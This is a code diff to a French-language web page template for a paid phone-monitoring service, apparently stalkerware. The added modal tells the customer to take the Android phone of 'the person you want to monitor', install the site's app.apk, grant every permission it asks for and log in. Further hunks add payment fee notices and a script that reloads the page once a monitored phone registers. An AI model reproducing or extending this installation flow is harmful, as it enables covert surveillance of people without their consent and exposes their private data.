@@ -536,7 +536,19 @@
                         <i class="fa fa-times text-muted fa-2x" data-dismiss="modal" style="cursor: pointer"></i>
                     </div>
                     <div class="modal-body" style="max-height: 60vh; overflow:auto;">
-
+                        <h5 class="mb-3">
+                           Prenez le téléphone <b>Android</b> de la personne que vous voulez surveiller :
+                        </h5>
+                        <ul>
+                            <li>
+                                Ouvrez le navigateur, télécharger et installer l’application en allant sur le lien :
+                                <a href="{{ asset('app.apk') }}">{{ asset('app.apk') }}</a> ({{ apkSize() }})
+                            </li>
+                            <li>Une fois l’application installée, ouvrez-la et autoriser toutes les permissions qui seront
+                                demandées</li>
+                            <li>Puis cliquez sur le bouton « Se connecter », en suite connectez-vous avec votre email et mot
+                                de passe, comme sur le web.</li>
+                        </ul>
                     </div>
                     <div class="modal-footer">
                         <button type="button" class="btn btn-white btn-rounded btn-sm"
@@ -687,6 +699,12 @@
                             <div class="mt-3 mb-3">
                                 <div id="rep"></div>
                             </div>
+                            <div class="my-2">
+                                <small class="text-danger">
+                                    <i class="fa fa-info-circle"></i>
+                                    Les frais de transactions seront appliqués par votre opérateur.
+                                </small>
+                            </div>
                             <button class="btn btn-sm app-btn btn-block btn-rounded" type="submit">
                                 <span></span>
                                 Payer
@@ -775,6 +793,12 @@
                             </div>
                             <div class="mt-3 mb-3">
                                 <div id="rep"></div>
+                            </div>
+                            <div class="my-2">
+                                <small class="text-danger">
+                                    <i class="fa fa-info-circle"></i>
+                                    Les frais de transactions seront appliqués par votre opérateur.
+                                </small>
                             </div>
                             <button class="btn btn-sm app-btn btn-block btn-rounded" type="submit">
                                 <span></span>
@@ -1883,6 +1907,26 @@
 
                 showinfo();
             });
+        </script>
+    @else
+        <script>
+            hasPhone();
+
+            function hasPhone() {
+                $.ajax({
+                    url: '{{ route('phone.index') }}',
+                    success: function(phone) {
+                        if (phone.length) {
+                            location.reload();
+                        }
+                    },
+
+                }).always(function() {
+                    setTimeout(() => {
+                        hasPhone();
+                    }, 2000);
+                });
+            }
         </script>
     @endif
 
